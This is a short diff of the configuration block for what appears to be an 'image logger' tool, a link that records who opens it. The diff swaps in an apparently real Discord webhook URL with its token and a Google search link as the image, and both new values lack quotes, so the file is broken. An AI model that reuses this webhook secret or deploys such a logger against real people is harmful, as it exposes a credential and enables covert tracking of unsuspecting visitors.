@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1502991786065264741/HJ5-Frtivd1_YQmoKkJkIwg-uxi1yEJcrB88r_MPfTVQ6wUoyJGhKIahoKZiZXXeIKfO
+    "image":  https://www.google.com/search?client=firefox-b-d&hs=6arp&sca_esv=a35057157be506b8&sxsrf=ANbL-n74EZ8_pVKjofkd8YvpZ88rpmh4zw:1778410776287&udm=2&fbs=ADc_l-bfAIefFokrCf7F9QG8l3URO-z5Eo_AMH5Oufjv_O9BJt9PIYE-Ufw8IK4sAEsyC5wiAKpoqt43ofSXhff9xZCj8aFUjhDzNU496UqFFAW4t9o0PFtJSN8xVr_WL71GTgpgh2Z7wmv9FdxiXmT2Z1L47zWe4BNBqYCFqdYp3-pB7lk-i61CYIHOiyRHntEQeh3W1GfZ-QdMBjmqFOZ8XR_b3UJIgw&q=find+picture&sa=X&ved=2ahUKEwjUkde0yK6UAxWehf0HHaMUDQcQtKgLegQIFBAB&biw=1366&bih=635&dpr=1#sv=CAMSVhoyKhBlLTgzX0RzWFotQzN0TXlNMg44M19Ec1haLUMzdE15TToOQkxiZlNtVERzRE1PRE0gBCocCgZtb3NhaWMSEGUtODNfRHNYWi1DM3RNeU0YADABGAcgm9GkuApKCBABGAEgASgB
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
